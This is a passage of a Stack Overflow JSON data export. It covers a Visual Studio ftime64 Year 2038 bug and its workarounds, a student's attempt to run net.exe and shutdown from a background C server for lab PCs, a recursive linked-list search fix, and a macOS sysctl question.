"https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 177852, "user_id": 576911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2a2941970f141aad669d13375dc57c4f?s=128&d=identicon&r=PG", "display_name": "Howard Hinnant", "link": "https://stackoverflow.com/users/576911/howard-hinnant"}, "edited": false, "score": 0, "creation_date": 1498010678, "post_id": 44664164, "comment_id": 76316654, "body": "@HowardHinnant oops copy/paste fail. Updated post."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498012345, "post_id": 44664164, "comment_id": 76317058, "body": "The Y2038 bug is still very much present in Windows. FILETIME is a good example of that."}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1498012377, "post_id": 44664164, "comment_id": 76317066, "body": "It is a simple bug in the common_ftime_s() template function, it has a <code>static_cast&lt;__time32_t&gt;</code>, should have been TimeType.  They&#39;ll get it fixed, call Microsoft Support if you can&#39;t wait."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498012908, "post_id": 44664164, "comment_id": 76317188, "body": "That&#39;s the plain _ftime64 function in the code above."}, {"owner": {"reputation": 177852, "user_id": 576911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2a2941970f141aad669d13375dc57c4f?s=128&d=identicon&r=PG", "display_name": "Howard Hinnant", "link": "https://stackoverflow.com/users/576911/howard-hinnant"}, "edited": false, "score": 0, "creation_date": 1498015534, "post_id": 44664164, "comment_id": 76317785, "body": "Here: <a href=\"https://github.com/HowardHinnant/date\" rel=\"nofollow noreferrer\">github.com/HowardHinnant/date</a> is a cross-platform date/time library that does not have the 2038 bug.  Runs on VS-2015.  I used it to catch your copy/paste fail.  Might be useful for you, might not, you decide."}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 0, "creation_date": 1498056618, "post_id": 44664164, "comment_id": 76343105, "body": "Maybe you have <code>_USE_32BIT_TIME_T</code> defined by some way."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1498068791, "post_id": 44664164, "comment_id": 76350839, "body": "@HansPassant the interesting thing is the regression from vc120 that hasn&#39;t been caught yet. I will have to contact support as this bug causes major problems and doesn&#39;t pass contractual tests to guarantee functionality past 2038!  How best to contact them?  I wonder how many pieces of software being written right now will be in use in 2038 and fail unexpectedly (hopefully not many)."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 0, "creation_date": 1498068860, "post_id": 44664164, "comment_id": 76350875, "body": "@AndreKampling _USE_32BIT_TIME_T is not defined."}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1498069107, "post_id": 44664164, "comment_id": 76351006, "body": "It ought to be a bit obvious that nobody is using this.  There just isn&#39;t much point in using these deprecated posix functions with their non-deprecated name, given that you have to type the underscore.  You might as well use the standard C library function and get it over with."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1498069668, "post_id": 44664164, "comment_id": 76351330, "body": "@HansPassant it doesn&#39;t seem to matter which version of ftime I call, it has the same result. What function do you think should be used instead?"}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1498069897, "post_id": 44664164, "comment_id": 76351469, "body": "The standard C library function, time().  time_t is a 64-bit type in the Microsoft CRT."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1498070527, "post_id": 44664164, "comment_id": 76351873, "body": "@HansPassant we need time in milliseconds, time() is in seconds."}, {"owner": {"reputation": 177852, "user_id": 576911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2a2941970f141aad669d13375dc57c4f?s=128&d=identicon&r=PG", "display_name": "Howard Hinnant", "link": "https://stackoverflow.com/users/576911/howard-hinnant"}, "edited": false, "score": 0, "creation_date": 1498076832, "post_id": 44664164, "comment_id": 76355456, "body": "Do you need local time, or UTC?  <code>system_clock::now()</code> will give you time since 1970-01-01 UTC in 1/10 microsecond precision, which you can then easily truncate (or round) to milliseconds, e.g. with <code>time_point_cast&lt;milliseconds&gt;(system_clock::now())</code>."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 177852, "user_id": 576911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2a2941970f141aad669d13375dc57c4f?s=128&d=identicon&r=PG", "display_name": "Howard Hinnant", "link": "https://stackoverflow.com/users/576911/howard-hinnant"}, "edited": false, "score": 0, "creation_date": 1498084883, "post_id": 44664164, "comment_id": 76358738, "body": "@HowardHinnant thanks. It looks like system_clock::now() isn&#39;t specified as UTC in the documentation. I do need time in UTC. Also this function is C++11, so I won&#39;t be able to use it across all supported platforms at this time, but I may still be able to use it in Windows."}, {"owner": {"reputation": 177852, "user_id": 576911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2a2941970f141aad669d13375dc57c4f?s=128&d=identicon&r=PG", "display_name": "Howard Hinnant", "link": "https://stackoverflow.com/users/576911/howard-hinnant"}, "edited": false, "score": 0, "creation_date": 1498087587, "post_id": 44664164, "comment_id": 76359511, "body": "It&#39;s true that the <code>system_clock</code> epoch is unspecified.  I&#39;m trying to get it specified (<a href=\"https://howardhinnant.github.io/date/d0355r3.html#time.clock.system\" rel=\"nofollow noreferrer\">howardhinnant.github.io/date/d0355r3.html#time.clock.system</a>&zwnj;&#8203;), and I have the unofficial assurance of the std::lib implementors that they will not move off of this de facto standard in the interim."}], "answers": [{"comments": [{"owner": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1500405795, "post_id": 45175326, "comment_id": 77319141, "body": "On the upside, the UCRT is shipped as part of the OS, so you don&#39;t need to update redistributable components that are bundled with your application."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1500410961, "post_id": 45175326, "comment_id": 77322162, "body": "But on the downside, you have to force the end-user to install UCRT on the target machine.  Also, if you are linking statically against the runtime (which I am to work around UCRT not being installed on the target machine, ie, Windows 7) you have to update your software deployment to get the fix."}], "tags": [], "owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "is_accepted": true, "score": 3, "last_activity_date": 1525811088, "last_edit_date": 1525811088, "creation_date": 1500405497, "answer_id": 45175326, "question_id": 44664164, "link": "https://stackoverflow.com/questions/44664164/visual-studio-2015-2017-year-2038-bug-with-ftime-functions/45175326#45175326", "title": "Visual Studio 2015/2017 Year 2038 bug with ftime functions", "body": "<p>After opening an issue with Microsoft Visual Studio support, they have confirmed this as a bug with Universal CRT that can be fixed by using an updated Windows SDK that is slated to release alongside Windows 10 Redstone 3 (aka Fall Creators Update).  An updated UCRT will also be released alongside RS3.</p>\n\n<p><strong>Update 2018/05/08:</strong> The Fall Creator's Update (1709) fixed this for applications linking dynamically against the CRT (/MD and /MDd). But in order to fix this when linking statically against the CRT (/MT and /MTd), you must change the Target Platform Version to <strong>10.0.16299.0</strong> (or later) and rebuild the application.</p>\n\n<p>The internal bug ID is: <strong>DevDiv.436129 , 437701</strong> </p>\n\n<p><strong>Workaround options:<br></strong>\nGetSystemTime(SYSTEMTIME *lpSystemTime)<br>\nSystemTimeToFileTime(const SYSTEMTIME *lpSystemTime, FILETIME *lpFileTime)</p>\n\n<p><strong>Requires Windows 8 or above:</strong><br>\nGetSystemTimePreciseAsFileTime(FILETIME *lpSystemTimeAsFileTime)</p>\n\n<p><strong>Convert SYSTEMTIME to FILETIME</strong><br>\nSYSTEMTIME starts in year 1601 while time_t usually starts in year 1970.\nTo convert to time_t you have to account for the difference in seconds between 1601 and 1970 (See: <a href=\"https://stackoverflow.com/questions/6161776/convert-windows-filetime-to-second-in-unix-linux#6161842\">Convert Windows Filetime to second in Unix/Linux</a>)</p>\n"}], "owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 406, "favorite_count": 0, "accepted_answer_id": 45175326, "answer_count": 1, "score": 4, "last_activity_date": 1525811088, "creation_date": 1497998763, "last_edit_date": 1498071983, "question_id": 44664164, "link": "https://stackoverflow.com/questions/44664164/visual-studio-2015-2017-year-2038-bug-with-ftime-functions", "title": "Visual Studio 2015/2017 Year 2038 bug with ftime functions", "body": "<p>I am migrating some code from vc120 to vc140 and I am running into a problem with ftime64.  The problem is similar to one mentioned on the <a href=\"https://developercommunity.visualstudio.com/content/problem/57100/-ftime64-does-not-work-past-the-year-2038.html\" rel=\"nofollow noreferrer\">Visual Studio dev community</a> where ftime64 seems to have a <a href=\"https://en.wikipedia.org/wiki/Year_2038_problem\" rel=\"nofollow noreferrer\">year-2038 bug</a> in 2015/2017 but where 2013 does not.</p>\n\n<p>Here's some example code:</p>\n\n<pre><code>#include \"stdafx.h\"\n#include &lt;sys/timeb.h&gt;\nint main()\n{\n  __timeb64 testTime64;  \n  _ftime64(&amp;testTime64);  \n  printf(\"%lld\\n\", testTime64.time);  \n  return 0;\n} \n</code></pre>\n\n<p>With dates after 03:14:07 UTC on 2038/01/19, the time appears to wrap over the 32-bit boundary.</p>\n\n<p>To test, compile the above code as ftime_check and run the following from an admin command prompt (note your numbers will vary due to the time of day on your clock):</p>\n\n<pre><code>date 1/18/2038 &amp;&amp; ftime_check\n2147474668\ndate 1/20/2038 &amp;&amp; ftime_check\n-2147319812\n</code></pre>\n\n<p>For reference, here is the (expected) output as seen under vc120:</p>\n\n<pre><code>date 1/18/2038 &amp;&amp; ftime_check\n2147482944\ndate 1/20/2038 &amp;&amp; ftime_check\n2147655752\n</code></pre>\n\n<p>I see the same issue with all of these functions ftime, _ftime, _ftime64, _ftime_s, and _ftime64_s</p>\n\n<p><strong>Is anyone else experiencing this, and how are you working around it?</strong></p>\n"}, {"tags": ["c", "windows", "server", "background-process", "shellexecute"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1497999160, "post_id": 44664105, "comment_id": 76313966, "body": "Whatever the issue is, &quot;Windows Runtime&quot; has nothing to do with it. WinRT is an alternative NT subsystem used by win8 and win10 &quot;apps&quot;. You compile your program for the traditional win32 subsystem, so it runs in this subsystem."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1498000092, "post_id": 44664105, "comment_id": 76314237, "body": "&quot;Windows Runtime doesn&#39;t allow programs to run shell commands; how can I run a shell command with Windows Runtime?&quot; is a stupid question, at least on the surface. But you presumably aren&#39;t using Windows Runtime so it&#39;s irrelevant."}, {"owner": {"reputation": 109956, "user_id": 159145, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/r8ryC.png?s=128&g=1", "display_name": "Dai", "link": "https://stackoverflow.com/users/159145/dai"}, "edited": false, "score": 1, "creation_date": 1498000869, "post_id": 44664105, "comment_id": 76314467, "body": "@FelixPalmen It isn&#39;t an &quot;alternative NT subsystem&quot; - it&#39;s still using the Win32 subsystem. WinRT is just a different userland API based on a COM derivative that often simply wraps existing Win32 functions - and others."}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 0, "creation_date": 1498005838, "post_id": 44664105, "comment_id": 76315602, "body": "Shelling out to a command should always be a last resort.  Use WNetAddConnection2() and InitiateShutdown() instead, at least that way if it doesn&#39;t work you&#39;ll get an error code telling you what the problem is."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 109956, "user_id": 159145, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/r8ryC.png?s=128&g=1", "display_name": "Dai", "link": "https://stackoverflow.com/users/159145/dai"}, "edited": false, "score": 0, "creation_date": 1498021715, "post_id": 44664105, "comment_id": 76319433, "body": "@Dai indeed, you&#39;re correct, it&#39;s &quot;just&quot; the API. Strange architectural decision having a system like NT, but whatever, a program also doesn&#39;t start using a different API just because it&#39;s running in the background ;)"}], "owner": {"reputation": 1, "user_id": 8190017, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df33800381ce1d009c5652037ad7ad27?s=128&d=identicon&r=PG&f=1", "display_name": "dominik", "link": "https://stackoverflow.com/users/8190017/dominik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 108, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1498030156, "creation_date": 1497998403, "last_edit_date": 1498030156, "question_id": 44664105, "link": "https://stackoverflow.com/questions/44664105/how-to-execute-net-exe-from-windows-runtime-in-c", "title": "How to execute net.exe from Windows Runtime in C?", "body": "<p>To introduce my problem, I'm currently working on a project to remotely shut down stationary PCs via Siemens S7 PLC. Those PCs are used for an experimental manufactoring line for relays at my university. The principle is quiet simple, the PLC sends the IP of a computer via UDP to a special \"always on\" PC with monitoring functions on which a UDP server listens for packets (this PC starts up together with the manufactoring line; OS is Windows 10; the server is written in C). If it receives an UDP packet, it triggers a <code>net use</code> command followed by a <code>shutdown</code> command to that specific IP. This works just fine, if the server.exe is started manually. The goal is to get the server working when it's automatically started with e.g. the taskplaner. Exactly this is the main issue here, it's not working as background task. It receives the packets (I tested it) but then nothing happens, no computer shuts down. So I guessed it must be the <code>net use</code> or the <code>shutdown</code> command. At first I tried to set up the <code>net use</code> with a <code>system()</code>call:</p>\n\n<pre><code>char command[100] = { 0 };\nsnprintf(command, sizeof(command), \"@NET USE \\\\\\\\%s\\\\IPC$ %s /USER:%s\", ip, pw, usr);\nsystem(command);\n</code></pre>\n\n<p>As this won't work I found following statement for <code>system()</code>on the <a href=\"https://msdn.microsoft.com/en-us/library/277bwbdz.aspx\" rel=\"nofollow noreferrer\">Windows API reference page</a>: </p>\n\n<blockquote>\n  <p>This API cannot be used in applications that execute in the Windows Runtime.</p>\n</blockquote>\n\n<p>So I figured I had to find an alternative, which leads me to my next try with the <code>ShellExecute()</code> function. It seemed like there are no problems concerning the execution out of the runtime, cause I could't find any word about it at the reference page. I tried:</p>\n\n<pre><code>char programpath[100] = \"C:\\\\Windows\\\\System32\\\\net.exe\";\nchar cmdline[100] = { 0 };\nsnprintf(cmdline, sizeof(cmdline), \"Use \\\\\\\\%s\\\\IPC$ %s /USER:%s\", ip, pw, usr);\nShellExecute(NULL, \"open\", programpath, cmdline, NULL, SW_HIDE);\n</code></pre>\n\n<p>But nope, won't work either from the background. When I asked my prof about it, he said he is more into Linux, so he could only guess that there might be a problem with the permissions. He meant that my server has possibly no rights to open those two programs, when calling them as background process. But even after a long time of investigating through the internet, I can't find a proper solution which fits to my problem. </p>\n"}, {"tags": ["c", "search", "recursion", "linked-list", "singly-linked-list"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 3, "creation_date": 1497998652, "post_id": 44664096, "comment_id": 76313816, "body": "Look at your <code>Search</code> invoke at the bottom. Hint: It returns something, but you&#39;re ignoring that result., Odds are it&#39;s caller is interested in that return value, <i>even if the caller is itself via recursion</i>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 4, "creation_date": 1497998681, "post_id": 44664096, "comment_id": 76313821, "body": "You don&#39;t always return a value from your function \u2014 you should."}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 1, "creation_date": 1497998730, "post_id": 44664096, "comment_id": 76313835, "body": "this code is UB since it drops out of a function declared as non void"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1497998941, "post_id": 44664096, "comment_id": 76313900, "body": "What is <code>head-&gt;nome</code>?  It should be a <code>CarroPtr</code>, but it looks more like a name.  You should probably use <code>return head;</code> rather than <code>return head-&gt;nome;</code>.  The <code>else</code> is a bit redundant since the <code>if</code> does an unconditional return.  The recursive call is also part of the <code>else</code> code (it is only executed when the <code>else</code> code is executed) \u2014 even though it is not in the <code>else</code> block."}, {"owner": {"reputation": 13, "user_id": 7426170, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/1640354279324627/picture?type=large", "display_name": "M&#225;rio Caldas", "link": "https://stackoverflow.com/users/7426170/m%c3%a1rio-caldas"}, "edited": false, "score": 0, "creation_date": 1497999165, "post_id": 44664096, "comment_id": 76313968, "body": "well i solve the problem,the error its in the returns. Thanks"}], "answers": [{"comments": [{"owner": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "edited": false, "score": 0, "creation_date": 1498002304, "post_id": 44664545, "comment_id": 76314835, "body": "Your return seems to return a mix of bool and CarroPtr. I suggest making it clearer by using an if within the body of CarroPtr rather than trying to do it all in one line:  if (head==NULL) return NULL; else return (head-&gt;matricula == num ? head : Search( head-&gt;next, num );"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "edited": false, "score": 0, "creation_date": 1498002477, "post_id": 44664545, "comment_id": 76314878, "body": "@ScottK The function returns pointer of the type CarroPtr. The one thing that could be done is enclosing the condition in parentheses though it is not required."}, {"owner": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "edited": false, "score": 0, "creation_date": 1498002649, "post_id": 44664545, "comment_id": 76314922, "body": "@Vlad_from_Moscow: I am confused by your solution. Won&#39;t &quot;return head == NULL) || ... evaluate to true if head equals NULL? The IF will then short-circuit since TRUE || anything is true. A bool does not seem to match the return type. If head != null, then the other part of the expression is evaluated which return a CarroPtr as expected. Am I missing something?"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "edited": false, "score": 0, "creation_date": 1498002770, "post_id": 44664545, "comment_id": 76314953, "body": "@ScottK There is used the so called conditional operator. You are right saying that if head is equal to true then the second operand of the logical OR operator will not be evaluated. But in any case the head will be returned that is the operand after the sign ? will be returned."}, {"owner": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "edited": false, "score": 0, "creation_date": 1498002974, "post_id": 44664545, "comment_id": 76315004, "body": "Thanks @Vlad_from_Moscow for the clarification. I missed that the &#39;?&#39; operator has very low precedence. Now that you have added the brackets, it makes it much clearer! Thanks!"}, {"owner": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "reply_to_user": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1498003166, "post_id": 44664545, "comment_id": 76315055, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/147216/discussion-between-scottk-and-vlad-from-moscow\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 2, "last_activity_date": 1498002976, "last_edit_date": 1498002976, "creation_date": 1498001379, "answer_id": 44664545, "question_id": 44664096, "link": "https://stackoverflow.com/questions/44664096/recursive-search-function-for-a-linked-list-in-c/44664545#44664545", "title": "Recursive Search Function for a Linked List in C", "body": "<p>It seems you mean the following</p>\n\n<pre><code>CarroPtr Search(CarroPtr head,int num)\n{\n    return head == NULL || head-&gt;matricula == num ? head : Search( head-&gt;next, num );\n}\n</code></pre>\n\n<p>Or you can enclose the condition of the ternary operator in parentheses if you think that in this case it will be more readable (though it is not required).</p>\n\n<pre><code>CarroPtr Search(CarroPtr head,int num)\n{\n    return ( head == NULL || head-&gt;matricula == num ) ? head : Search( head-&gt;next, num );\n}\n</code></pre>\n\n<p>As for your code then the function either tries to return objects of different types like <code>head</code> and <code>head-&gt;nome</code> or returns nothing as in the case of the statement with the call of the function</p>\n\n<pre><code>Search(head, num);\n</code></pre>\n\n<p>that leads to undefined behavior..</p>\n"}], "owner": {"reputation": 13, "user_id": 7426170, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/1640354279324627/picture?type=large", "display_name": "M&#225;rio Caldas", "link": "https://stackoverflow.com/users/7426170/m%c3%a1rio-caldas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 44664545, "answer_count": 1, "score": 1, "last_activity_date": 1498002976, "creation_date": 1497998364, "last_edit_date": 1498001980, "question_id": 44664096, "link": "https://stackoverflow.com/questions/44664096/recursive-search-function-for-a-linked-list-in-c", "title": "Recursive Search Function for a Linked List in C", "body": "<p>I made a linked list of cars.\nAnd I'm trying to make a recursive function Search.\nHere is what I did.\nFor some reason this doesn't work.  Please can you explain why and how to fix it?</p>\n\n<pre><code>CarroPtr Search(CarroPtr head,int num)\n{\n   printf(\"Matricula %d\\n\", num);\n\n   if (head == NULL)\n    {\n     return NULL;\n    }\n\n   if (head-&gt;matricula == num)\n    {\n     return head-&gt;nome;\n    }\n   else\n    {\n     head = head-&gt;next;\n    }\n\n  Search(head, num);\n\n}\n</code></pre>\n"}, {"tags": ["c", "macos", "kernel", "low-level", "sysctl"], "comments": [{"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 1, "creation_date": 1497999345, "post_id": 44663911, "comment_id": 76314021, "body": "what happens if you run sysctl from the command line... something like this <code>sysctl -a | egrep -i &#39;hw.machine&#39;</code>?  I bet it doesn&#39;t find anything"}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "reply_to_user": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1498001125, "post_id": 44663911, "comment_id": 76314521, "body": "@bruceg Works for me: <code>hw.machine: x86_64</code>"}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": 